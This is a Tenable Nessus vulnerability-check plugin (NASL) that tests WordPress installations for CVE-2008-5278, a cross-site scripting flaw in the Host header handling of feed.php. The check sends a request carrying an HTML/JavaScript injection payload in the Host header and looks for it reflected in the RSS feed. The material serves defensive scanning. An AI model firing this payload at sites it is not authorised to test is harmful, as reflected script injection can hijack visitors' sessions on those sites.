#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34994);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/06/13 20:14:28 $");

  script_cve_id("CVE-2008-5278");
  script_bugtraq_id(32476);
  script_osvdb_id(50214);
  script_xref(name:"Secunia", value:"32882");

  script_name(english:"WordPress wp-includes/feed.php self_link() Function Host Header RSS Feed XSS");
  script_summary(english:"Attempts to influence absolute URL in the RSS2 feed output.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host fails to
properly sanitize input to the 'Host' request header before using it
in the 'self_link()' function in 'wp-includes/feed.php' to generate
dynamic HTML output. An attacker can leverage this issue to inject
arbitrary HTML and script code into a user's browser to be executed
within the security context of the affected site.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/498652/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/development/2008/11/wordpress-265/");
  script_set_attribute(attribute:"solution", value:"Upgrade to WordPress version 2.6.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/11/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/11/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/12/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Unless we're paranoid, make sure it's Apache.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port, exit_on_fail:TRUE);
  if ("Apache" >!< banner) audit(AUDIT_WRONG_WEB_SERVER, port, "Apache");
}

 # Figure out how to call the RSS feed, which is included in the HTML header.
res = http_get_cache(item:dir + "/index.php", port:port, exit_on_fail:TRUE);

head = res - strstr(res, '</head>');

url = dir + "/wp-rss2.php";
if ('type="application/rss+xml"' >< head)
{
  foreach line (split(head, keep:FALSE))
  {
    if ('type="application/rss+xml"' >< line)
    {
      href = strstr(line, ' href="') - ' href="';
      href = href - strstr(href, '"');

      href = strstr(href, '//') - '//';
      href = strstr(href, '/');

      if (stridx(href, dir) == 0)
      {
        url = href;
        break;
      }
    }
  }
}

exploit = SCRIPT_NAME + '"><body onload=alert(String.fromCharCode(88,83,83))>';

req = http_mk_get_req(
  port : port,
  item : url,
  add_headers : make_array("Host", exploit)
);
res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

# There's a problem if we see our (escaped) exploit in the atom link.
esc_exploit = ereg_replace(pattern:'"', replace:'\\"', string:exploit);
if ('<atom:link href="http://' + esc_exploit >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
  if (report_verbosity > 0)
  {
    req_str = http_mk_buffer_from_req(req:req);
    report =
        '\n' +
        'Nessus was able to exploit the issue using the following request :\n'+
        '\n' +
        '  ' + str_replace(find:'\r\n', replace:'\n  ', string:req_str) + '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
